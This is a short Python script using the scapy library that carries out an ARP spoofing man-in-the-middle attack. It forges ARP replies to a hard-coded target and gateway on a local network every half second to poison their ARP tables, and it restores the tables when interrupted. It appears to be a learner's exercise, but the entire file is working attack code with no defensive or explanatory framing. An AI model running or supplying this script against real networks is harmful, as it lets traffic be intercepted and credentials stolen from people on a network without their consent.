#!/usr/bin/env python
import time
import sys

import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    # scapy.srp get 2 lists, using scapy.srp()[0] to get the first list, with is answered_list
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose= False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
# scapy.ls(scapy.ARP)
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac=get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = "192.168.10.234"
gateway_ip = "192.168.10.254"

send_packets_count = 0
try:
    while True:
        spoof(gateway_ip, target_ip)
        spoof(target_ip, gateway_ip)

        send_packets_count = send_packets_count + 2
        print("\r[+] Packets send : " + str(send_packets_count)),
        # print("\r[+] Packets send : " + str(send_packets_count), end="")  ==> Python3
        sys.stdout.flush()
        time.sleep(0.5)
except KeyboardInterrupt:
    print("\r\n[-] Detected CTRL + C ......Resetting ARP tables ......Please wait.\n")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)